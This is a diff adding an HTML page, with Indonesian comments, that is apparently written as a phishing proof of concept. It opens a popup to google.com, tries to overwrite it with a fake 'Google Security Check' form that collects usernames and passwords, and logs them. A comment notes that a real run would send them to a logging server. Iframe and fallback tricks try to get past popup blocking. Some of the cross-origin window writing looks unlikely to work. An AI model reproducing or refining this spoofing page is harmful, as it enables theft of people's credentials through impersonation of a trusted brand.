@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Testing Page</title>
+</head>
+<body>
+    <button onclick="startSpoof()">Start Test</button>
+    
+    <script>
+        function startSpoof() {
+            // Coba multiple approach
+            if (!attemptSpoofV1() && !attemptSpoofV2()) {
+                fallbackMethod();
+            }
+        }
+
+        function attemptSpoofV1() {
+            try {
+                // Method 1: Direct approach dengan delay lebih lama
+                const win = window.open("https://www.google.com", "_blank");
+                
+                if (!win) {
+                    console.log("Popup blocked");
+                    return false;
+                }
+                
+                setTimeout(() => {
+                    try {
+                        // Cek jika window masih accessible
+                        if (win.closed) return;
+                        
+                        win.document.write(`
+                            <!DOCTYPE html>
+                            <html>
+                            <head>
+                                <title>Google</title>
+                                <style>
+                                    body { font-family: Arial, sans-serif; padding: 20px; }
+                                    input { margin: 5px; padding: 8px; width: 200px; }
+                                </style>
+                            </head>
+                            <body>
+                                <h1>Google Security Check</h1>
+                                <p>Please verify your identity:</p>
+                                <input type="text" id="username" placeholder="Username/Email">
+                                <br>
+                                <input type="password" id="password" placeholder="Password">
+                                <br>
+                                <button onclick="submitCreds()">Verify</button>
+                                
+                                <script>
+                                    function submitCreds() {
+                                        const user = document.getElementById('username').value;
+                                        const pass = document.getElementById('password').value;
+                                        alert('Verification submitted');
+                                        // Dalam real pentest, kirim ke logging server
+                                        console.log('Credentials:', {username: user, password: pass});
+                                    }
+                                <\/script>
+                            </body>
+                            </html>
+                        `);
+                        win.document.close();
+                        return true;
+                    } catch (e) {
+                        console.warn("Method 1 failed:", e);
+                        return false;
+                    }
+                }, 150); // Delay lebih lama untuk mobile
+                
+            } catch (error) {
+                console.warn("Method 1 blocked:", error);
+                return false;
+            }
+        }
+
+        function attemptSpoofV2() {
+            // Method 2: Iframe approach terlebih dahulu
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = 'https://www.google.com';
+                document.body.appendChild(iframe);
+                
+                setTimeout(() => {
+                    const win = window.open('', '_blank');
+                    if (win) {
+                        win.document.write('<h1>Security Portal</h1><p>Loading...</p>');
+                        win.document.close();
+                    }
+                }, 100);
+                
+                return true;
+            } catch (e) {
+                console.warn("Method 2 failed:", e);
+                return false;
+            }
+        }
+
+        function fallbackMethod() {
+            // Fallback: Redirect current page
+            alert("Advanced testing requires direct window access. Continuing with current page...");
+            document.body.innerHTML = `
+                <h1>Security Verification Required</h1>
+                <p>This is a simulated security test page</p>
+                <p><strong>NOTE: This is only a penetration test</strong></p>
+            `;
+        }
+    </script>
+</body>
+</html>
